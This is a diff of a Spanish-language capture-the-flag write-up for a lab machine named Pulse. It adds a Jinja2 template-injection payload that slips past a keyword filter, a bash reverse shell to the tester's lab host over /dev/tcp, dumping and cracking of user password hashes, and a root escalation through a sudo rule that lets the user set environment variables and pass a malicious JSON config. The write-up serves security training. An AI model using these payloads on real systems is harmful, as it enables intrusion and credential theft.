@@ -103,7 +103,8 @@ De este mensaje obtenemos información importante:
 - EL monitoreo real se movió al subdominio: <mark>http://monitor.pulse.hmv</mark>
 - La carpeta de repositorio `./git` <mark>esta expuesta</mark>.
 - El endpoint `/diagnostics` requiere autorización, <mark>el token esta expuesto en el repositorio</mark>.
-- La sincronización de usuarios se ejecuta desde la ruta `/opt/pulse`.
+- La sincronización de la base de datos de usuarios se ejecuta desde la ruta `/opt/pulse`.
+- Posible usuario: <mark>Alex Morgan (alex@pulse.hmv)</mark>  
 
 Si accedemos ahora al archivo `robots.txt`.
 
@@ -119,7 +120,7 @@ Disallow: /internal/
 Vemos que la nota refuerza la indicación de que el monitoreo se ha movido a: `http://monitor.pulse.hmv`, agreguemos ese subdominio al archivo `hosts` para acceder a el.
 
 ```bash
-echo "10.20.2.14 http://monitor.pulse.hmv" | tee -a /etc/hosts > /dev/null
+echo "10.20.2.14 monitor.pulse.hmv" | tee -a /etc/hosts > /dev/null
 ```
 
 Accedamos ahora a `http://monitor.pulse.hmv`.
@@ -230,4 +231,263 @@ Como vemos da un error, seguramente el sistema esta configurado para detectar es
 ...
 ```
 
-Para saltarnos este filtro podemos utilizar las técnicas de <mark>Ofuscación de Payloads y Evasión de Filtros (Filter Bypass</mark>, se puede fragmentar la palabra utilizando el operador de concatenación de Jinja (`~`) o simplemente uniendo cadenas consecutivas, por ejemplo: `object['pop' ~ 'en']`.
+Para saltarnos este filtro podemos utilizar las técnicas de <mark>Ofuscación de Payloads y Evasión de Filtros (Filter Bypass)</mark>, se puede fragmentar la palabra utilizando el operador de concatenación de Jinja (`~`) o simplemente uniendo cadenas consecutivas, por ejemplo: `object['pop' ~ 'en']`.
+
+```jinja
+{{ cycler.__init__.__globals__['o'~'s']['p'~'open']('id')['re'+'ad']() }}
+```
+
+![](media/Pasted_image_20261004221521.png)
+
+# Acceso
+---
+
+Como vemos pasa el filtro y nos damos cuenta que el usuario actual es `www-data`, podemos aprovechar esta vulnerabilidad para tratar de obtener una shell inversa y buscar otros usuarios para poder escalar privilegios. Lo primero que vamos a hacer es utilizar `nc` para abrir un `listener` con el cual podamos conectar la shell inversa.
+
+```bash
+nc -lvnp 4443
+```
+
+Plantilla `jinja`
+
+```jinja
+{{ cycler.__init__.__globals__['o'~'s']['p'~'open']('bash -c "bash -i >& /dev/tcp/10.20.2.4/4443 0>&1"')['re'~'ad']() }}
+```
+
+```
+listening on [any] 4443 ...
+connect to [10.20.2.4] from (UNKNOWN) [10.20.2.12] 40620
+bash: cannot set terminal process group (811): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@pulse:~/monitor$
+```
+
+Bien hemos accedido a la maquina como usuario `www-data`, este usuario es muy limitado, hagamos un `ls` a la carpeta `home`, para ver si existen otros usuarios.
+
+```bash
+ls /home
+```
+
+```
+alex
+ubuntu
+```
+
+Vemos que existen dos usuarios mas: `alex` y `ubuntu`, en el aviso que encontramos anteriormente obtuvimos datos de un posible usuario que coinciden con `alex`, ahora también de ese aviso obtuvimos la ruta de sincronización de la base de datos, podemos analizar esa ruta para ver si podemos obtener información para cambiar de usuario; antes que nada estabilicemos la shell obtenida:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+#Ctrl + Z
+stty raw -echo; fg
+reset
+screen
+export TERM=xterm-256color 
+export SHELL=bash
+```
+
+Listamos el contenido de `/opt/pulse`
+
+```bash
+ls -la /opt/pulse/
+```
+
+```
+total 12
+drwxr-xr-x 3 root www-data 4096 Sep 10 10:11 .
+drwxr-xr-x 3 root root     4096 Sep 10 10:11 ..
+drwxr-xr-x 2 root www-data 4096 Sep 10 10:11 data
+```
+
+Existe un directorio llamado `data`, revidemos que hay en su interior
+
+```
+ls -la /opt/pulse/data/
+```
+
+```
+total 28
+drwxr-xr-x 2 root www-data  4096 Sep 10 10:11 .
+drwxr-xr-x 3 root www-data  4096 Sep 10 10:11 ..
+-rw-r--r-- 1 root www-data 20480 Sep 10 10:11 users.db
+```
+
+Dentro se encuentra un archivo llamado `users.db` si hacemos vemos en su interior con `cat`, veremos que es un archivo de base de datos sqlite, como usuario `www-data` por lo regular se tiene acceso a las bases de datos, así que tratemos de hacer una consulta a ese archivo para ver que obtenemos.
+
+```bash
+cd /opt/pulse/data/
+```
+
+Tablas existentes
+
+```bash
+sqlite3 users.db "SELECT name FROM sqlite_master WHERE type='table';"
+```
+
+```
+users
+sqlite_sequence
+system_metrics
+```
+
+Consulta a tabla `users`, para ver si existen usuarios y contraseñas que podamos utilizar.
+
+```bash
+sqlite3 users.db "SELECT * FROM users;"
+```
+
+```
+1|admin|admin@pulse.hmv|Platform Director|$6$pulse$9QxK2vM3b1P4zY8nL0eW7tD5rA2sC6fG1hJ3kL5mN7pQ9rT1vW3xY5z0b2d4f6h8|2026-09-10 10:10:46
+2|alex|alex@pulse.hmv|Lead Infrastructure Engineer|$6$pulse$A0zjfe.Tf.0/0cJ6usQ/5FQMcTJJ5uADzhShund6hYEke.QqiWn7U5vAYbjc2exfZXGmHrrJTukBURkCqrjOk1|2026-09-10 10:10:46
+3|operator|operator@pulse.hmv|Tier-1 NOC Specialist|$6$pulse$H5kL9mP2qR4tV6wX8zA1cE3gI5kM7oQ9sU1wY3b5d7f9h1j3l5n7p9r1t3v5|2026-09-10 10:10:46
+```
+
+Existen datos de tres usuarios, el que nos interesa es el segundo, ya que coincide con el usuario que existe en el sistema, sin embargo las contraseñas parecen estar cifradas o `hasheadas`, podemos utilizar, copiamos la contraseña de `alex` a un archivo de texto que podamos analizar.
+
+```
+echo "$6$pulse$A0zjfe.Tf.0/0cJ6usQ/5FQMcTJJ5uADzhShund6hYEke.QqiWn7U5vAYbjc2exfZXGmHrrJTukBURkCqrjOk1" > hash.txt
+```
+
+Analizamos el archivo con `Jhon the Ripper`
+
+```bash
+john hash.txt
+```
+
+```
+Warning: detected hash type "sha512crypt"
+```
+
+Vemos que reconoce el hash como `sha512crypt`, podemos utilizar la opción `--show`, para ver si con el listado propio puede descifrar el hash.
+
+```bash
+jonh --show hash.txt
+```
+
+```
+?:starlight
+
+1 password hash cracked, 0 left
+```
+
+Vemos que ha logrado descifrar el hash, ahora tenemos: `alex:starlight`, si recordamos esta abierto el puerto `22`, así que tratemos de conectarnos mediante `ssh`, con estas credenciales.
+
+```bash
+ssh alex@10.20.2.14
+# password: starlight
+```
+
+```
+...
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+alex@pulse:~$ 
+```
+
+Hemos obtenido el acceso, si listamos el contenido de la carpeta actual, vemos que se encuentra un archivo llamado `user.txt`, que tal vez valga la pena revisar.
+
+# Escalada de privilegios
+---
+
+Ahora que tenemos el acceso podemos verificar si existe algún comando o script que el usuario actual pueda utilizar como usuario `root`, para tratar de escalar privilegios. Buscaremos que comandos puede ejecutar este usuario mediante `sudo`.
+
+```bash
+sudo -l
+```
+
+```
+User alex may run the following commands on pulse:
+    (ALL : ALL) SETENV: NOPASSWD: /usr/local/bin/pulse-audit
+```
+
+Esto significa que:
+- `(ALL : ALL)` → se puede ejecutar `/usr/local/bin/pulse-audit` como **cualquier usuario y grupo**, incluido `root`.
+- `NOPASSWD` → no se necesita introducir la contraseña.
+- `SETENV` → se puede establecer/modificar variables de entorno al ejecutar el programa.
+
+Si revisamos el contenido con `cat`, veremos que la vulnerabilidad esta precisamente en `SETENV`, específicamente en las siguientes líneas:
+
+```python
+...
+config_path = os.environ.get("PULSE_CONFIG", "/etc/pulse/audit_rules.json")
+...
+with open(config_path, "r") as f:
+            cfg = json.load(f)
+...
+subprocess.run(cfg["pre_audit_cmd"], shell=True)
+...
+```
+
+En la primer línea se establece una ruta para la variable de entorno `PULSE_CONFIG` la cual carga un archivo `Json`, en la segunda parte se abre ese archivo para leer el contenido del archivo y en la última línea permite la ejecución de una propiedad del `Json`.
+
+Analizando el archivo `audit_rules.json`, podemos ver su estructura.
+
+```json
+{
+    "policy_name": "Production-Baseline-Security-Audit",
+    "monitored_services": ["nginx", "ssh", "pulse-monitor"],
+    "pre_audit_cmd": "",
+    "post_audit_cmd": "",
+    "log_destination": "/var/log/pulse/audit.log"
+}
+```
+
+Con esto en cuenta, podemos crear un archivo `Json` con la misma estructura ejecutando una shell en la propiedad `pre_audit_cmd`, para escalar privilegios.
+
+Crear `Json` malicioso.
+
+```bash
+cat > /tmp/audit.json <<'EOF'
+{
+  "policy_name": "CTF",
+  "pre_audit_cmd": "/bin/bash"
+}
+EOF
+```
+
+Ejecutamos el comando haciendo referencia al archivo malicioso.
+
+```bash
+sudo PULSE_CONFIG=/tmp/audit.json /usr/local/bin/pulse-audit
+```
+
+Obtenemos la shell de `root`.
+
+```
+======================================================
+   Pulse Infrastructure Automated Security Auditor
+   Version 1.8.2-enterprise
+======================================================
+
+[*] Loading audit profile from: /tmp/audit.json
+[+] Active Audit Policy: CTF
+[*] Executing pre-audit routine: /bin/bash
+root@pulse:/home/alex#
+```
+
+```bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Nos cambiamos a la carpeta de `root` y listamos su contenido.
+
+```bash
+cd ~
+```
+
+```
+otal 36
+drwx------  4 root root 4096 Sep 10 10:11 ./
+drwxr-xr-x 20 root root 4096 Sep  6 10:35 ../
+lrwxrwxrwx  1 root root    9 Sep 10 10:11 .bash_history@ -> /dev/null
+-rw-r--r--  1 root root 3106 Apr 20 08:46 .bashrc
+lrwxrwxrwx  1 root root    9 Sep 10 10:11 .lesshst@ -> /dev/null
+-rw-r--r--  1 root root  132 Apr 20 08:46 .profile
+drwx------  2 root root 4096 Sep  6 10:43 .ssh/
+-rw-------  1 root root   38 Sep 10 10:11 root.txt
+drwx------  3 root root 4096 Sep  6 10:43 snap/
+-r-xr-xr-x  1 root root 7037 Sep  6 10:43 vboxpostinstall.sh*
+```
+
+Si revisamos el contenido del archivo `root.txt`, puede ser que hayamos encontrado el final de nuestra auditoria.
